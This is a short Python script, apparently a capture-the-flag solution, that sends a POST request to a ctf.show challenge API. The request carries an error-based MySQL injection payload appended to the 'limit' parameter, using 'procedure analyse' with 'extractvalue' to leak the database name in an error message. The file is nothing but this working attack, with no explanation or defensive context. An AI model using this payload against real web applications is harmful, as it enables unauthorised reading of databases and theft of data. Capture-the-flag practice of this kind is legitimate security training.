import requests

url = "http://b37c446f-6f27-4cf4-b948-76dd04cd5167.challenge.ctf.show/api/"

payload = "page=10&limit=10 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1);"

print(payload)

responses = requests.request("POST", url=url, data=payload)

print(responses.text)